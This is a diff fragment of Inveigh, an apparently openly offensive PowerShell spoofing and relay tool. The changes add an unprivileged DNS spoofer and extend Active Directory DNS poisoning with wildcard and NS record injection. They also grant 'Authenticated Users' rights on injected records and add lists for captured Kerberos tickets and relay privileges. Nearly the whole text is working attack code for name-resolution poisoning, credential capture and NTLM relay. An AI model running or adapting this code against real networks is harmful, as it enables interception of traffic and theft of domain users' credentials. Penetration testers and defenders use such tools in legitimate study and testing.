+            $source_IP = $DNS_listener_endpoint.Address
+            $DNS_response_type = "[+]"
+
+            if(!$Inspect)
+            {
+                $DNS_destination_endpoint = New-Object System.Net.IPEndpoint($DNS_listener_endpoint.Address,$DNS_listener_endpoint.Port)
+                $DNS_UDP_client.Connect($DNS_destination_endpoint)
+                $DNS_UDP_client.Send($DNS_response_packet,$DNS_response_packet.Length)
+                $DNS_UDP_client.Close()
+                $DNS_UDP_client = New-Object System.Net.Sockets.UdpClient 53
+                $DNS_UDP_client.Client.ReceiveTimeout = 5000
+                $DNS_response_message = "[response sent]"
+            }
+            else
+            {
+                $DNS_response_message = "[something went wrong]"
+            }
+           
+            $inveigh.output_queue.Add("$DNS_response_type [$(Get-Date -format s)] DNS request for $DNS_query_string received from $source_IP $DNS_response_message") > $null
+            $DNS_request_data = $null
+        }
+        
+    }
+
+    $DNS_UDP_client.Close()
+}
+
 # Unprivileged LLMNR Spoofer ScriptBlock 
 $LLMNR_spoofer_scriptblock = 
 {
@@ -4817,6 +5113,9 @@ $LLMNR_spoofer_scriptblock =
     catch
     {
         $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting LLMNR spoofer") > $null
+        $error_message = $_.Exception.Message
+        $error_message = $error_message -replace "`n",""
+        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         $LLMNR_running = $false
     }
 
@@ -4915,6 +5214,9 @@ $mDNS_spoofer_scriptblock =
     catch
     {
         $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting mDNS spoofer") > $null
+        $error_message = $_.Exception.Message
+        $error_message = $error_message -replace "`n",""
+        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         $mDNS_running = $false
     }
 
@@ -5031,7 +5333,7 @@ $mDNS_spoofer_scriptblock =
     }
 
     $mDNS_UDP_client.Close()
- }
+}
 
 # Unprivileged NBNS Spoofer ScriptBlock
 $NBNS_spoofer_scriptblock = 
@@ -5049,6 +5351,9 @@ $NBNS_spoofer_scriptblock =
     catch
     {
         $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] Error starting NBNS spoofer") > $null
+        $error_message = $_.Exception.Message
+        $error_message = $error_message -replace "`n",""
+        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
         $NBNS_running = $false
     }
 
@@ -5251,9 +5556,10 @@ $NBNS_bruteforce_spoofer_scriptblock =
 # Control Loop ScriptBlock
 $control_scriptblock =
 {
-    param ($ADIDNSCleanup,[System.Management.Automation.PSCredential]$ADIDNSCredential,$ADIDNSDomain,
-        $ADIDNSDomainController,$ADIDNSForest,$ADIDNSHostsIgnore,$ADIDNSPartition,$ADIDNSThreshold,$ADIDNSTTL,
-        $ADIDNSZone,$ConsoleQueueLimit,$NBNSBruteForcePause,$RunCount,$RunTime,$SpooferIP)
+    param ($ADIDNSACE,$ADIDNSCleanup,[System.Management.Automation.PSCredential]$ADIDNSCredential,$ADIDNSDomain,
+        $ADIDNSDomainController,$ADIDNSForest,$ADIDNSHostsIgnore,$ADIDNSNS,$ADIDNSNSTarget,$ADIDNSPartition,
+        $ADIDNSThreshold,$ADIDNSTTL,$ADIDNSZone,$ConsoleQueueLimit,$elevated_privilege,$NBNSBruteForcePause,
+        $RunCount,$RunTime,$SpooferIP)
 
     function Invoke-OutputQueueLoop
     {
@@ -5304,30 +5610,14 @@ $control_scriptblock =
 
         }
 
-        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS -eq 'Wildcard')
+        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS_table.Count -gt 0)
         {
-
-            try
-            {
-                Disable-ADIDNSNode -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node '*' -Partition $ADIDNSPartition -Zone $ADIDNSZone
-            }
-            catch
-            {
-                $error_message = $_.Exception.Message
-                $error_message = $error_message -replace "`n",""
-                $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-            }
-            
-        }
-
-        if($ADIDNSCleanup -eq 'Y' -and $inveigh.ADIDNS -eq 'Combo' -and $inveigh.ADIDNS_table.Count -gt 0)
-        {
-            $ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys
+            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys
 
             foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
             {
- 
-                if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)
+                
+                if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)
                 {
 
                     try
@@ -5340,7 +5630,7 @@ $control_scriptblock =
                         $error_message = $_.Exception.Message
                         $error_message = $error_message -replace "`n",""
                         $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
-                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host (A) record for $ADIDNS_host remove failed") > $null
+                        $inveigh.output_queue.Add("[-] [$(Get-Date -format s)] ADIDNS host record for $ADIDNS_host remove failed") > $null
                     }
 
                 }
@@ -5373,7 +5663,6 @@ $control_scriptblock =
 
         if($inveigh.running)
         {
-            Start-Sleep -m 100
 
             if($Message)
             {
@@ -5385,16 +5674,39 @@ $control_scriptblock =
             }
 
             Invoke-OutputQueueLoop
-            Start-Sleep -m 100
+
+            if(!$elevated_privilege)
+            {
+                Start-Sleep -s 3
+            }
+
             $inveigh.running = $false
         }
 
+        $inveigh.ADIDNS = $null
         $inveigh.HTTPS = $false
     }
 
-    if($inveigh.ADIDNS -eq 'Wildcard')
+    if($inveigh.ADIDNS -contains 'Wildcard')
     {
-        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node '*' -Partition $ADIDNSPartition -TTL $ADIDNSTTL -Zone $ADIDNSZone
+        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node '*' -Partition $ADIDNSPartition -Type 'A'-TTL $ADIDNSTTL -Zone $ADIDNSZone
+    }
+
+    if($inveigh.ADIDNS -contains 'NS')
+    {
+
+        if($ADIDNSNSTarget.EndsWith($ADIDNSZone))
+        {
+            $NS_data = $ADIDNSNSTarget
+            $ADIDNSNSTarget = $ADIDNSNSTarget -replace ".$ADIDNSZone",''
+        }
+        else
+        {
+            $NS_data = $ADIDNSNSTarget + "." + $ADIDNSZone
+        }
+
+        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $SpooferIP -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNSTarget -Partition $ADIDNSPartition -Type 'A' -TTL $ADIDNSTTL -Zone $ADIDNSZone
+        Invoke-ADIDNSSpoofer -Credential $ADIDNSCredential -Data $NS_data -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Forest $ADIDNSForest -Node $ADIDNSNS -Partition $ADIDNSPartition -Type 'NS' -TTL $ADIDNSTTL -Zone $ADIDNSZone
     }
 
     if($NBNSBruteForcePause)
@@ -5445,7 +5757,7 @@ $control_scriptblock =
 
         }
 
-        if($inveigh.ADIDNS -eq 'Combo' -and $inveigh.request_table_updated)
+        if($inveigh.ADIDNS -contains 'Combo' -and $inveigh.request_table_updated)
         {
             
             try
@@ -5460,6 +5772,35 @@ $control_scriptblock =
             }
 
             $inveigh.request_table_updated = $false
+        }
+
+        if($inveigh.ADIDNS -and $inveigh.ADIDNS_table.Count -gt 0)
+        {
+            [Array]$ADIDNS_table_keys_temp = $inveigh.ADIDNS_table.Keys
+
+            foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
+            {
+                
+                if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)
+                {
+
+                    try
+                    {
+                        Grant-ADIDNSPermission -Credential $ADIDNSCredential -Domain $ADIDNSDomain -DomainController $ADIDNSDomainController -Node $ADIDNS_host -Principal 'Authenticated Users'-Zone $ADIDNSZone
+                        $inveigh.ADIDNS_table.$ADIDNS_host = 2
+                    }
+                    catch
+                    {
+                        $error_message = $_.Exception.Message
+                        $error_message = $error_message -replace "`n",""
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                        $inveigh.output_queue.Add("[!] [$(Get-Date -format s)] ADIDNS ACE add for host record for $ADIDNS_host failed") > $null
+                    }
+
+                }
+
+            }
+
         }
 
         if($inveigh.file_output)
@@ -5518,7 +5859,6 @@ $control_scriptblock =
         {
             $inveigh.console_queue.Clear()
             Stop-InveighRunspace
-            Start-Sleep -S 1
         }
 
     }
@@ -5568,7 +5908,7 @@ function HTTPSListener
     $HTTPS_powershell.AddScript($HTTP_scriptblock).AddArgument($Challenge).AddArgument($Kerberos).AddArgument(
         $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument(
         $KerberosHostHeader).AddArgument($HTTPAuth).AddArgument($HTTPBasicRealm).AddArgument(
-        $HTTPContentType).AddArgument($HTTPSIP).AddArgument($HTTPSPort).AddArgument(
+        $HTTPContentType).AddArgument($HTTPIP).AddArgument($HTTPSPort).AddArgument(
         $HTTPDefaultEXE).AddArgument($HTTPDefaultFile).AddArgument($HTTPDir).AddArgument(
         $HTTPResponse).AddArgument($HTTPS_listener).AddArgument($NBNSBruteForcePause).AddArgument(
         $output_directory).AddArgument($Proxy).AddArgument($ProxyIgnore).AddArgument($proxy_listener).AddArgument(
@@ -5612,18 +5952,33 @@ function SnifferSpoofer
     $sniffer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($kerberos_functions_scriptblock) > $null
     $sniffer_powershell.AddScript($SMB_NTLM_functions_scriptblock) > $null
-    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($EvadeRG).AddArgument($IP).AddArgument(
-        $Kerberos).AddArgument($KerberosCount).AddArgument($KerberosCredential).AddArgument(
-        $KerberosHash).AddArgument($LLMNR).AddArgument($LLMNR_response_message).AddArgument(
-        $LLMNRTTL).AddArgument($mDNS).AddArgument($mDNS_response_message).AddArgument($mDNSTypes).AddArgument(
-        $mDNSTTL).AddArgument($NBNS).AddArgument($NBNS_response_message).AddArgument($NBNSTTL).AddArgument(
-        $NBNSTypes).AddArgument($output_directory).AddArgument($PcapOutput).AddArgument($PcapPortTCP).AddArgument(
+    $sniffer_powershell.AddScript($sniffer_scriptblock).AddArgument($DNS).AddArgument($DNSTTL).AddArgument(
+        $DNS_response_message).AddArgument($EvadeRG).AddArgument($IP).AddArgument($Kerberos).AddArgument(
+        $KerberosCount).AddArgument($KerberosCredential).AddArgument($KerberosHash).AddArgument($LLMNR).AddArgument(
+        $LLMNR_response_message).AddArgument($LLMNRTTL).AddArgument($mDNS).AddArgument(
+        $mDNS_response_message).AddArgument($mDNSTypes).AddArgument($mDNSTTL).AddArgument($NBNS).AddArgument(
+        $NBNS_response_message).AddArgument($NBNSTTL).AddArgument($NBNSTypes).AddArgument(
+        $output_directory).AddArgument($PcapOutput).AddArgument($PcapPortTCP).AddArgument(
         $PcapPortUDP).AddArgument($SMB).AddArgument($SpooferHostsIgnore).AddArgument(
         $SpooferHostsReply).AddArgument($SpooferIP).AddArgument($SpooferIPsIgnore).AddArgument(
         $SpooferIPsReply).AddArgument($SpooferLearning).AddArgument($SpooferLearningDelay).AddArgument(
         $SpooferLearningInterval).AddArgument($SpooferNonprintable).AddArgument(
         $SpooferThresholdHost).AddArgument($SpooferThresholdNetwork) > $null
     $sniffer_powershell.BeginInvoke() > $null
+}
+
+# Unprivileged DNS Spoofer Startup Function
+function DNSSpoofer
+{
+    $DNS_spoofer_runspace = [RunspaceFactory]::CreateRunspace()
+    $DNS_spoofer_runspace.Open()
+    $DNS_spoofer_runspace.SessionStateProxy.SetVariable('inveigh',$inveigh)
+    $DNS_spoofer_powershell = [PowerShell]::Create()
+    $DNS_spoofer_powershell.Runspace = $DNS_spoofer_runspace
+    $DNS_spoofer_powershell.AddScript($shared_basic_functions_scriptblock) > $null
+    $DNS_spoofer_powershell.AddScript($DNS_spoofer_scriptblock).AddArgument($Inspect).AddArgument(
+        $DNS_response_message).AddArgument($DNSTTL).AddArgument($SpooferIP) > $null
+    $DNS_spoofer_powershell.BeginInvoke() > $null
 }
 
 # Unprivileged LLMNR Spoofer Startup Function
@@ -5699,12 +6054,13 @@ function ControlLoop
     $control_powershell.Runspace = $control_runspace
     $control_powershell.AddScript($shared_basic_functions_scriptblock) > $null
     $control_powershell.AddScript($ADIDNS_functions_scriptblock) > $null
-    $control_powershell.AddScript($control_scriptblock).AddArgument($ADIDNSCleanup).AddArgument(
-        $ADIDNSCredential).AddArgument($ADIDNSDomain).AddArgument($ADIDNSDomainController).AddArgument(
-        $ADIDNSForest).AddArgument($ADIDNSHostsIgnore).AddArgument($ADIDNSPartition).AddArgument(
+    $control_powershell.AddScript($control_scriptblock).AddArgument($ADIDNSACE).AddArgument(
+        $ADIDNSCleanup).AddArgument($ADIDNSCredential).AddArgument($ADIDNSDomain).AddArgument(
+        $ADIDNSDomainController).AddArgument($ADIDNSForest).AddArgument($ADIDNSHostsIgnore).AddArgument(
+        $ADIDNSNS).AddArgument($ADIDNSNSTarget).AddArgument($ADIDNSPartition).AddArgument(
         $ADIDNSThreshold).AddArgument($ADIDNSTTL).AddArgument($ADIDNSZone).AddArgument(
-        $ConsoleQueueLimit).AddArgument($NBNSBruteForcePause).AddArgument($RunCount).AddArgument(
-        $RunTime).AddArgument($SpooferIP) > $null
+        $ConsoleQueueLimit).AddArgument($elevated_privilege).AddArgument($NBNSBruteForcePause).AddArgument(
+        $RunCount).AddArgument($RunTime).AddArgument($SpooferIP) > $null
     $control_powershell.BeginInvoke() > $null
 }
 
@@ -5730,12 +6086,17 @@ if($Proxy -eq 'Y')
 }
 
 # Sniffer/Spoofer Start
-if(($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $Inspect) -and $elevated_privilege)
+if(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y' -or $Inspect) -and $elevated_privilege)
 { 
     SnifferSpoofer
 }
-elseif(($LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !$elevated_privilege)
+elseif(($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y' -or $SMB -eq 'Y') -and !$elevated_privilege)
 {
+
+    if($DNS -eq 'Y')
+    {
+        DNSSpoofer
+    }
 
     if($LLMNR -eq 'Y')
     {
@@ -5805,7 +6166,7 @@ try
                         $inveigh.console_queue.RemoveAt(0)
                     }
 
-                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
+                    {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                     {
 
                         if($ConsoleOutput -eq 'Y')
@@ -6028,7 +6389,6 @@ Stop-Inveigh will stop all running Inveigh functions.
         {
             $inveigh.console_queue.Clear()
             Watch-Inveigh -NoConsoleMessage
-            Start-Sleep -S 2
         }
         else
         {
@@ -6169,7 +6529,7 @@ Get relay session list.
         foreach($ADIDNS_host in $ADIDNS_table_keys_temp)
         {
             
-            if($inveigh.ADIDNS_table.$ADIDNS_host -eq 1)
+            if($inveigh.ADIDNS_table.$ADIDNS_host -ge 1)
             {
                 Write-Output $ADIDNS_host
             }
@@ -6364,7 +6724,7 @@ if($inveigh.tool -ne 1)
                         $inveigh.console_queue.RemoveAt(0)
                     }
 
-                    {$_ -like "* spoofer is disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
+                    {$_ -like "* spoofer disabled" -or $_ -like "* local request" -or $_ -like "* host header *" -or $_ -like "* user agent received *"}
                     {
 
                         if($ConsoleOutput -eq 'Y')
@@ -6497,6 +6857,8 @@ function ConvertTo-Inveigh
         $inveigh.enumerate = New-Object System.Collections.ArrayList
         $inveigh.IP_capture_list = New-Object System.Collections.ArrayList
         $inveigh.log = New-Object System.Collections.ArrayList
+        $inveigh.kerberos_TGT_list = New-Object System.Collections.ArrayList
+        $inveigh.kerberos_TGT_username_list = New-Object System.Collections.ArrayList
         $inveigh.NTLMv1_list = New-Object System.Collections.ArrayList
         $inveigh.NTLMv1_username_list = New-Object System.Collections.ArrayList
         $inveigh.NTLMv2_list = New-Object System.Collections.ArrayList
@@ -6504,6 +6866,7 @@ function ConvertTo-Inveigh
         $inveigh.POST_request_list = New-Object System.Collections.ArrayList
         $inveigh.valid_host_list = New-Object System.Collections.ArrayList
         $inveigh.ADIDNS_table = [HashTable]::Synchronized(@{})
+        $inveigh.relay_privilege_table = [HashTable]::Synchronized(@{})
         $inveigh.relay_failed_login_table = [HashTable]::Synchronized(@{})
         $inveigh.relay_history_table = [HashTable]::Synchronized(@{})
         $inveigh.request_table = [HashTable]::Synchronized(@{})
@@ -6515,7 +6878,7 @@ function ConvertTo-Inveigh
         $inveigh.domain_mapping_table = [HashTable]::Synchronized(@{})
         $inveigh.group_table = [HashTable]::Synchronized(@{})
         $inveigh.session_count = 0
-        $inveigh.session = @()
+    $inveigh.session = @()
     }
 
     function New-RelayEnumObject
